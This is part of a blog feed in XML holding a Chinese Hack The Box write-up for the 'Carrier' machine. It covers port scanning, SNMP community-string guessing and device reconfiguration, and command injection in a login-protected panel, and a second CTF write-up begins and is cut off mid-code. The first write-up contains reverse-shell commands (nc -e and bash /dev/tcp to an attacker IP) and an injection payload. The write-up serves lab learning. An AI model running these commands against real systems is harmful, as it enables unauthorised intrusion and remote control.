    <category term="sqlmap" scheme="http://example.com/categories/sqlmap/"/>
    
    
    <category term="sqlmap" scheme="http://example.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>HTB Carrier</title>
    <link href="http://example.com/2022/07/30/HTB-Carrier/"/>
    <id>http://example.com/2022/07/30/HTB-Carrier/</id>
    <published>2022-07-30T05:42:02.000Z</published>
    <updated>2022-08-01T17:40:17.001Z</updated>
    
    <content type="html"><![CDATA[<p>看来还是要从高分往低分去做 呜呜呜</p><span id="more"></span><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>先看一下端口</p><p>先拿nmap去扫一下</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sV -<span class="keyword">sT</span> -<span class="keyword">sC</span> -o nmapinitial 10.10.10.105</span><br><span class="line">Starting Nmap 7.92 ( https:<span class="comment">//nmap.org ) at 2022-07-30 01:46 EDT</span></span><br><span class="line">Nmap scan <span class="keyword">report</span> <span class="keyword">for</span> 10.10.10.105</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (<span class="keyword">no</span>-response)</span><br><span class="line">PORT   STATE SERVICE    <span class="keyword">VERSION</span></span><br><span class="line">22/tcp <span class="keyword">open</span>  tcpwrapped</span><br><span class="line">|_ssh-hostkey: <span class="keyword">ERROR</span>: Script execution failed (<span class="keyword">use</span> -<span class="keyword">d</span> to debug)</span><br><span class="line">80/tcp <span class="keyword">open</span>  tcpwrapped</span><br><span class="line">|_http-title: Login</span><br><span class="line"></span><br><span class="line">Service detection performed. Please <span class="keyword">report</span> any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned <span class="keyword">in</span> 73.20 seconds</span><br></pre></td></tr></table></figure><p>不过没看懂这啥意思 找到一个好玩的网站 <a href="https://explainshell.com/">https://explainshell.com/</a></p><p>或者这样</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -sC -sV -oA <span class="keyword">nmap</span>/initial -vv -T3 ip</span><br></pre></td></tr></table></figure><p>Ok， 开了两个端口</p><p>应该就是单点渗透了</p><h2 id="2-初步测试"><a href="#2-初步测试" class="headerlink" title="2.初步测试"></a>2.初步测试</h2><p><img src="/2022/07/30/HTB-Carrier/image-20220730135632941.png" alt="image-20220730135632941"></p><p>只有一个登录框</p><p>先扫一下目录先</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.105</span><span class="regexp">/ -w /u</span>sr<span class="regexp">/share/</span>wordlists<span class="regexp">/dirb/</span>common.txt -t <span class="number">100</span> </span><br></pre></td></tr></table></figure><p>加上 -t 控制线程 会更快</p><p>但有点乱说实话</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/<span class="selector-class">.hta</span>                 (Status: <span class="number">403</span>) <span class="selector-attr">[Size: 291]</span></span><br><span class="line">/<span class="selector-class">.htpasswd</span>            (Status: <span class="number">403</span>) <span class="selector-attr">[Size: 296]</span></span><br><span class="line">/<span class="selector-class">.htaccess</span>            (Status: <span class="number">403</span>) <span class="selector-attr">[Size: 296]</span></span><br><span class="line">/css                  (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 310]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/css/]</span></span><br><span class="line">/debug                (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 312]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/debug/]</span></span><br><span class="line">/doc                  (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 310]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/doc/]</span>  </span><br><span class="line">/<span class="selector-tag">img</span>                  (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 310]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/img/]</span>  </span><br><span class="line">/index<span class="selector-class">.php</span>            (Status: <span class="number">200</span>) <span class="selector-attr">[Size: 1509]</span>                                </span><br><span class="line">/js                   (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 309]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/js/]</span>   </span><br><span class="line">/server-status        (Status: <span class="number">403</span>) <span class="selector-attr">[Size: 300]</span>                                 </span><br><span class="line">/tools                (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 312]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/tools/]</span></span><br></pre></td></tr></table></figure><p>看看存不存在弱密码或者注入</p><p><strong>说实话 不知道为什么 我最近看到跳转的就不想去看了 这不对</strong></p><p><strong>得到一下三点有用信息</strong></p><ul><li><a href="http://10.10.10.105/doc/diagram_for_tac.png">http://10.10.10.105/doc/diagram_for_tac.png</a></li></ul><p><img src="/2022/07/30/HTB-Carrier/diagram_for_tac.png" alt="img"></p><p>这里也说明了 存在别的服务但是我们没有发现</p><ul><li><p><a href="http://10.10.10.105/debug/">http://10.10.10.105/debug/</a> 直接 phpinfo 给出了</p></li><li><p>再来看看  <a href="http://10.10.10.105/doc/error_codes.pdf">http://10.10.10.105/doc/error_codes.pdf</a>  这里有各种错误对应的码</p></li><li><img src="/2022/07/30/HTB-Carrier/image-20220801221801885.png" alt="image-20220801221801885" style="zoom: 50%;"></li></ul><p>可以看到的是页面上已经有两个错误码了</p><p>45007 和 45009</p><h2 id="2-继续做信息收集"><a href="#2-继续做信息收集" class="headerlink" title="2.继续做信息收集"></a>2.继续做信息收集</h2><p>nmap怎么才能更详细地去扫？</p><p>我觉得我要重新学习一边nmap 我太菜了</p><p><a href="https://www.freebuf.com/sectool/264941.html">NMAP参数详解 - FreeBuf网络安全行业门户</a></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">UDP</span>扫描：（UDP扫描费时，所以去掉-p-，默认扫描）nmap -sU <span class="built_in">ip</span></span><br></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sU <span class="number">10.10.10.105</span></span><br></pre></td></tr></table></figure><p>这里我实在是受不了了 太慢了</p><p>改用 masscan</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">masscan</span> --rate=<span class="number">1000</span> -p U:<span class="number">0</span>-<span class="number">65535</span> --banners <span class="number">10.10.10.105</span></span><br></pre></td></tr></table></figure><p>快多了 但却是没扫出来啊啊啊啊啊</p><p>什么情况</p><p>只有这样才扫出来？大无语</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -o nmapudp 10.10.10.105</span><br></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PORT</span>    STATE SERVICE</span><br><span class="line"><span class="number">161</span>/udp <span class="keyword">open</span>  snmp</span><br></pre></td></tr></table></figure><p>ok 可以来看看 这 161 端口</p><h3 id="啥是snmp？"><a href="#啥是snmp？" class="headerlink" title="啥是snmp？"></a>啥是snmp？</h3><p><a href="https://www.freebuf.com/articles/network/319234.html">实战SNMP服务攻击 - FreeBuf网络安全行业门户</a></p><h4 id="SNMP基础"><a href="#SNMP基础" class="headerlink" title="SNMP基础"></a>SNMP基础</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>SNMP全称简单网络管理协议，是专门设计用于在IP网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，是一种应用层协议。通过SNMP可以访问设备信息、改写和配置设备参数等，SNMP运行在UDP161端口上，采用UDP协议在管理端和agent之间传输信息。</p><h5 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h5><p>SNMP架构主要分如下三个部分组成：</p><ul><li><strong>网络管理系统（NMS，Network-management systems）</strong></li><li><strong>被管理的设备（managed device）</strong></li><li><strong>代理者（agent）</strong></li></ul><p>上面这三部分从名字上看很复杂，其实很简单。我们只需要知道，”NMS”就是客户端，”被管理的设备”就是交换机、路由器之类的设备，而”代理者”可以理解为装在交换机上的一个程序而已。</p><h5 id="SNMP版本"><a href="#SNMP版本" class="headerlink" title="SNMP版本"></a>SNMP版本</h5><p>SNMP目前共有<strong>v1、v2c、v3</strong>这三个版本：</p><ul><li>SNMP v1是SNMP协议的最初版本，不过依然是众多厂家实现SNMP的基本方式；</li><li>SNMP v2c通常被指是基于Community的SNMP v2c，<strong>而Community本质上就是密码；</strong></li><li>SNMP v3是最新版本的SNMP，它对网络管理最大的贡献在于其安全性，增加了对认证和密文传输的支持。</li></ul><h4 id="Community-String"><a href="#Community-String" class="headerlink" title="Community String"></a>Community String</h4><p><code>Community String</code>在交换机与路由器配置里意为”社区字符串”也有人叫”团体名”，其实说的都是一个东西。Community其实就是充当<strong>密码</strong>作用的一串字符串而已。大多数的设备供应商，默认都有两个Community String：</p><ul><li><strong>public 通常用来查询(只读)</strong></li><li><strong>private 通常用来查询和配置(读写)</strong></li></ul><p>P.S：很多安全问题就是由这两个”默认密码”而引发的。</p><h4 id="MIB和OID"><a href="#MIB和OID" class="headerlink" title="MIB和OID"></a>MIB和OID</h4><p>MIB全称管理信息库，是一种<strong>树状数据库；</strong>MIB管理的对象，就是树的节点。每个节点都有唯一名字和唯一OID(Object Identifier)，OID由树上的一系列整数组成，整数之间用点( . )分隔开，树的叶子节点才是真正能够被管理的对象。</p><p>我们通过SNMP获取信息就会用到OID，比如网络设备名的OID 是.1.3.6.1.2.1.1.5.0，其值为设备名称的字符串。简单点来理解就是：<strong>把MIB当成一个k.v数据库，我们输入key(OID)就能获取到对应的value</strong>。</p><p>为了方便查阅，我们收集了一些OID列表和MIB库。</p><ul><li><a href="https://www.10-strike.com/network-monitor/pro/useful-snmp-oids.shtml">https://www.10-strike.com/network-monitor/pro/useful-snmp-oids.shtml</a></li><li><a href="https://gist.github.com/JosefJezek/6824959">https://gist.github.com/JosefJezek/6824959</a></li><li><a href="http://www.ttlsa.com/monitor/snmp-oid/">http://www.ttlsa.com/monitor/snmp-oid/</a></li></ul><p><strong>OID查询</strong></p><ul><li><a href="http://www.oid-info.com/cgi-bin/display?tree=#focus">http://www.oid-info.com/cgi-bin/display?tree=#focus</a></li><li><a href="https://bestmonitoringtools.com/mibdb/mibdb_search.php">https://bestmonitoringtools.com/mibdb/mibdb_search.php</a></li></ul><p>除了上面提到的，其实还有一种方法可以获取MIB库。那就是直接从设备供应商的官网进行下载，如下是我在<a href="http://www.h3c.com/cn/d_200906/636062_30003_0.htm#_Toc231200798">h3c文档</a>上看到的。<img src="/2022/07/30/HTB-Carrier/1641805247_61dbf5bf35eaff7c66e33.jpeg" alt="img"></p><h3 id="UDP-和-TCP-啥区别？"><a href="#UDP-和-TCP-啥区别？" class="headerlink" title="UDP 和 TCP 啥区别？"></a>UDP 和 TCP 啥区别？</h3><blockquote><p>UDP简介： UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的 上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报 文发送之后，是无法得知其是否安全完整到达的。</p><p>UDP显著特性： </p><p>1.UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被 复制，被重新排序，也不保证每个数据报只到达一次</p><p>2.UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的 地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任 何（协议上的）记录边界。 </p><p>3.UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都 选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报 4.UDP 支持多播和广播</p></blockquote><p><img src="/2022/07/30/HTB-Carrier/v2-315b593f06c45856ce70de5e2d8d8ec2_1440w.jpg" alt="img"></p><p><a href="https://blog.csdn.net/Li_Ning_/article/details/52117463">https://blog.csdn.net/Li_Ning_/article/details/52117463</a></p><h3 id="基于UDP的扫描"><a href="#基于UDP的扫描" class="headerlink" title="基于UDP的扫描"></a>基于UDP的扫描</h3><h4 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmao</span> -sU -T5 -sV --max-retries <span class="number">1</span> <span class="number">192.168.1.100</span> -p <span class="number">500</span> （不推荐，理由慢）</span><br></pre></td></tr></table></figure><blockquote><p>-sU 基于UDP的扫描</p><p>-T5 nmap的扫描速度 -T（0-5）越大越快</p><p>-sV  探测开启的端口来获取服务、版本信息</p><p>–max-retries <tries>  扫描探测的上限次数设定</tries></p><p>-p 只扫描指定端口</p></blockquote><h4 id="msf扫描"><a href="#msf扫描" class="headerlink" title="msf扫描"></a>msf扫描</h4><p>两个模块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary<span class="regexp">/scanner/</span>discovery/udp_prob</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary<span class="regexp">/scanner/</span>discovery/udp_sweep</span><br></pre></td></tr></table></figure><blockquote><p>use 引用</p><p>show options 显示可设置的参数</p><p>auxiliary （辅助）/ scanner（扫描）/discovery（发现）/udp_probe（探测）/udp_sweep(彻底搜索)</p></blockquote><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msf6</span> auxiliary(scanner/discovery/udp_sweep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Sending <span class="number">13</span> probes to <span class="number">10.10.10.105</span>-&gt;<span class="number">10.10.10.105</span> (<span class="number">1</span> hosts)</span><br><span class="line">[*] Discovered SNMP <span class="literal">on</span> <span class="number">10.10.10.105:161</span> ()</span><br><span class="line">[*] Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>下次再也不用nmap了 太慢了 艹</p><h4 id="net-snmp"><a href="#net-snmp" class="headerlink" title="net-snmp"></a>net-snmp</h4><p>kali系统里面已经内置net-snmp工具包，我们直接终端输入命令即可使用；net-snmp是我们本次测试SNMP主要工具，后续的操作都采用这款工具进行演示和操作。</p><p>Net-snmp工具包提供如下工具，支持对交换机进行各种操作。</p><p><img src="/2022/07/30/HTB-Carrier/1641805341_61dbf61d0762d2e683677.jpeg" alt="img"></p><p>而我们平常主要使用snmpwalk、snmpget、snmpset这三款工具进行测试。snmpwalk和snmpget都可以用来获取值，其主要区别是snmpwalk是对OID值的遍历，而snmpget是取具体的OID的值。</p><h2 id="4-打snmp"><a href="#4-打snmp" class="headerlink" title="4.打snmp"></a>4.打snmp</h2><p><strong>首先要去获取一个叫 Community String 的东西</strong>，前面的基础知识已经介绍了Community String就是密码，所以我们要想使用SNMP肯定需要先知道它对应的”密码”。</p><p>然后分为两个步骤</p><h3 id="默认密码尝试-amp-爆破"><a href="#默认密码尝试-amp-爆破" class="headerlink" title="默认密码尝试&amp;爆破"></a>默认密码尝试&amp;爆破</h3><p>大多数的设备供应商和一些网管都喜欢用public和private。</p><p><img src="/2022/07/30/HTB-Carrier/image-20220801233558415.png" alt="image-20220801233558415"></p><p>还真给试出来了</p><p>如果通过手动尝试默认密码失败之后，我们还可以进行爆破。一般SNMP密码都不会太复杂，很容易就跑出来了。</p><p>进行SNMP密码爆破，我们需要用到一款新的工具onesixtyone</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp/sql]</span><br><span class="line">└─<span class="comment"># onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.10.10.105  -w 64 </span></span><br><span class="line">Scanning 1 hosts, 51 communities</span><br><span class="line">10.10.10.105 [public] Host responded with error NO SUCH NAME</span><br></pre></td></tr></table></figure><p>也不知道这算不算扫出来了(应该算吧</p><p>这里有个string <code>STRING: &quot;SN#NET_45JDX23&quot;</code></p><p>看了眼wp 说这是登录密码 （捂脸） 我经验太少啦</p><h3 id="snmp攻击学习"><a href="#snmp攻击学习" class="headerlink" title="snmp攻击学习"></a>snmp攻击学习</h3><h4 id="敏感信息获取"><a href="#敏感信息获取" class="headerlink" title="敏感信息获取"></a>敏感信息获取</h4><p>敏感信息获取。在拿到”密码”之后我们就可以开始下一步利用了，我们需要收集什么信息可以通过之前提供的OID表进行查询，需要注意的是不同设备OID是不同的。</p><ul><li>获取设备名</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpget</span> -c private -v2c <span class="number">192.168.6.1</span> .<span class="number">1.3.6.1</span>.<span class="number">2.1.1.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/30/HTB-Carrier/1641805894_61dbf846f127775bd0cf4.jpeg" alt="img"></p><ul><li>获取设备运行了多久</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpget</span> -c private -v2c <span class="number">192.168.6.1</span> <span class="number">1.3.6.1</span>.<span class="number">2.1.1.3</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/30/HTB-Carrier/1641805938_61dbf872e61277d133d94.jpeg" alt="img"></p><ul><li>获取设备划分的vlan</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpwalk</span> -c private -v2c <span class="number">192.168.6.1</span> <span class="number">1.3.6.1</span>.<span class="number">4</span>.<span class="number">1</span>.<span class="number">25506</span>.<span class="number">8.35.2.1</span>.<span class="number">5</span>.<span class="number">1</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/30/HTB-Carrier/1641805972_61dbf8945cb1e5a640a45.jpeg" alt="img"></p><ul><li>获取设备开放的端口</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpwalk</span> -c private -v2c <span class="number">192.168.6.1</span> <span class="number">1.3.6.1</span>.<span class="number">2.1.6.13</span>.<span class="number">1</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/30/HTB-Carrier/1641805987_61dbf8a307d0fcec572cd.jpeg" alt="img"></p><ul><li>获取存活的内网ip</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpwalk</span> -c private -v2c <span class="number">192.168.6.1</span> <span class="number">1.3.6.1</span>.<span class="number">2.1.4.22</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">634</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/30/HTB-Carrier/1641805999_61dbf8afd9ec1c48455c6.jpeg" alt="img"></p><p>如果嫌找OID太麻烦，还可以直接用snmpwalk遍历整个MIB库。然后把数据保存下来慢慢翻，这也是种不错的选择。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -<span class="keyword">c</span> <span class="keyword">private</span> -v<span class="number">2</span><span class="keyword">c</span> <span class="number">192.168</span>.<span class="number">6.1</span> &gt;&gt;h<span class="number">3</span>c_oid.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/07/30/HTB-Carrier/1641806378_61dbfa2a9d557d318c4ad.jpeg" alt="img"></p><p>P.S：如果查询的内容返回值是单条信息，如”设备名称”可以用snmpget工具进行查询。如果是返回多条信息如”vlan信息”就需要用snmpwalk工具进行查询。snmpwalk单条信息和多条信息都使用，因为它是对OID进行遍历操作。</p><h4 id="设备配置修改"><a href="#设备配置修改" class="headerlink" title="设备配置修改"></a>设备配置修改</h4><p>除了可以读取信息，我们还可以对设备的配置进行修改。但这样做侵入性非常高，不建议这样做，一旦操作失误，极有可能暴露自己，从而导致权限的丢失。下面简单的演示一下配置修改：</p><p>我们先获取设备的名称。从返回值我们可以知道该设备名是”H3C”</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpget</span> -c private -v2c <span class="number">192.168.6.1</span> .<span class="number">1.3.6.1</span>.<span class="number">2.1.1.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/30/HTB-Carrier/1641806281_61dbf9c9c97837ed6a1a8.jpeg" alt="img"></p><p>我们尝试对其进行修改，把名称改为”hacker”。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpset</span> -c private -v2c <span class="number">192.168.6.1</span> .<span class="number">1.3.6.1</span>.<span class="number">2.1.1.5</span>.<span class="number">0</span> s <span class="string">&quot;hacker&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/30/HTB-Carrier/1641806255_61dbf9af395a3b33b012f.jpeg" alt="img"></p><p>再次获取设备名，发现已经修改成功了。</p><p><img src="/2022/07/30/HTB-Carrier/1641806225_61dbf9913416bd30af2d6.jpeg" alt="img"></p><p>如果拿到的”社区字符串”是只读权限的，我们尝试修改会报如下错误：</p><p><img src="/2022/07/30/HTB-Carrier/1641806105_61dbf919c59d8d8c30207.jpeg" alt="img"></p><p>在实战中，我们可以根据目标具体的场景来做不同的修改：如改一下设备的<strong>ACL。</strong></p><h4 id="SNMP-rce"><a href="#SNMP-rce" class="headerlink" title="SNMP rce"></a>SNMP rce</h4><p>最后再来谈谈rce。SNMP并不是所有设备都可以被rce，目前看来好几个可以rce的都已经加到msf模块里面了。除此之外，如果目标是linux系统还可以借助<strong>NET-SNMP-EXTEND-MIB</strong>来进行rce。由于篇幅原因这里不再深入研究，具体操作可见下面两篇文章：</p><ul><li><a href="https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/">https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/</a></li><li><a href="https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/">https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/</a></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.cnblogs.com/xdp-gacl/p/3978825.html">https://www.cnblogs.com/xdp-gacl/p/3978825.html</a></li><li><a href="https://www.anquanke.com/post/id/85976">https://www.anquanke.com/post/id/85976</a></li><li><a href="https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/">https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/</a></li><li><a href="https://www.anquanke.com/post/id/85976">https://www.anquanke.com/post/id/85976</a></li><li><a href="https://www.anquanke.com/post/id/260832#h3-8">https://www.anquanke.com/post/id/260832#h3-8</a></li></ul><h2 id="5-登录后继续测试"><a href="#5-登录后继续测试" class="headerlink" title="5.登录后继续测试"></a>5.登录后继续测试</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户 <span class="literal">admin</span></span><br><span class="line">密码 NET_45JDX23</span><br></pre></td></tr></table></figure><p>然后再去看看有没有什么可以打的地方</p><p><img src="/2022/07/30/HTB-Carrier/image-20220802003007736.png" alt="image-20220802003007736"></p><p>在这里找到了 像是可以进行命令执行的东西</p><p>抓个包来看看</p><p><img src="/2022/07/30/HTB-Carrier/image-20220802003346930.png" alt="image-20220802003346930"></p><p>base64解一下码试一试</p><img src="/2022/07/30/HTB-Carrier/image-20220802003328767.png" alt="image-20220802003328767" style="zoom:50%;"><p>ok 感觉命令执行有了</p><p>试了几条命令好像没啥反应 试了下 id 结果有反应了</p><p><img src="/2022/07/30/HTB-Carrier/image-20220802004055803.png" alt="image-20220802004055803"></p><p>但我还是没搞明白 到低怎么直接执行命令 估计是要去拼接什么东西？</p><p><a href="http://t.zoukankan.com/lsgxeva-p-14028910.html">Quagga的安装和使用 - 走看看 (zoukankan.com)</a></p><p>我大意了  加个<code>;</code> 就可以直接命令执行  小技巧 果然需要积累啊啊啊</p><p><img src="/2022/07/30/HTB-Carrier/image-20220802004942414.png" alt="image-20220802004942414"></p><p>bp ctrl + B 即可base64 （每天一个小技巧</p><p>可以命令执行后 我们想要反弹一个shell</p><p>貌似curl跑不通 试试直接反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/sh <span class="number">10.10.14.7</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>;bash -i &gt;&amp; /dev/tcp/<span class="number">10.10.14.7</span>/<span class="number">5000</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>估计是环境 or 网有问题 反弹shell过不来 草</p><h2 id="6-路由劫持部分"><a href="#6-路由劫持部分" class="headerlink" title="6.路由劫持部分"></a>6.路由劫持部分</h2><p>这块说实话我是小白一个 </p><p><a href="https://www.freebuf.com/geek/293403.html">关于BGP那些事儿 - FreeBuf网络安全行业门户</a></p><h1 id="升华部分"><a href="#升华部分" class="headerlink" title="升华部分"></a>升华部分</h1><p>现在我们通过这题来思考一个问题</p><p>假如给你一个登录框</p><p>你应该测试哪些东西？如何去测试</p><p>正好这两天再先知社区上看到一个人写了类似的文章 这里 我也来总结一下</p><p><a href="https://xz.aliyun.com/t/11577">实战登录框漏洞测试 - 先知社区 (aliyun.com)</a></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h2 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h2><h3 id="验证码内容是否可控？"><a href="#验证码内容是否可控？" class="headerlink" title="验证码内容是否可控？"></a>验证码内容是否可控？</h3><h3 id="越权与逻辑漏洞"><a href="#越权与逻辑漏洞" class="headerlink" title="越权与逻辑漏洞"></a>越权与逻辑漏洞</h3>]]></content>
    
    
    <summary type="html">&lt;p&gt;看来还是要从高分往低分去做 呜呜呜&lt;/p&gt;</summary>
    
    
    
    <category term="HTB" scheme="http://example.com/categories/HTB/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/HTB/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="HTB" scheme="http://example.com/tags/HTB/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>qwb2022</title>
    <link href="http://example.com/2022/07/30/qwb2022/"/>
    <id>http://example.com/2022/07/30/qwb2022/</id>
    <published>2022-07-30T01:22:57.000Z</published>
    <updated>2022-08-01T09:17:44.663Z</updated>
    
    <content type="html"><![CDATA[<p>wp 我的队友和我真强</p><p><img src="/2022/07/30/qwb2022/image-20220801131740906.png" alt="image-20220801131740906"></p><h2 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h2><p><a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index,php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.inc.php&quot;</span>;</span><br><span class="line"></span><br><span 